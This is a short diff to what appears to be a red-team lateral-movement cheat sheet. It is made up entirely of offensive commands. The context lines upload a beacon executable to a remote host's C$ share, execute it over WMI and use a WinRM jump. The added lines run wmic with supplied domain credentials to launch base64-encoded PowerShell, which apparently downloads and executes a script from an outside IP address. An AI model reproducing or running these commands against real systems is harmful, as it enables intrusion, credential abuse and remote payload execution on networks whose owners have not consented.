@@ -40,6 +40,10 @@ upload C:\payloads\tcp-beacon.exe (\\wkstn-4945\c$\Windows\Temp\tcp-beacon.exe)
 remote-exec wmi wkstn-4945 C:\Windows\Temp\tcp-beacon.exe
 connect wkstn-4945 1337
 ```
+```
+shell wmic /node:WS02 /user:DOMAIN\insomnia.io /password:insomnia process call create "powershell.exe -Enc B7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA=="
+
+```
 ### PowerShell Remoting
 ```
 jump winrm64 wkstn-4945 tcp
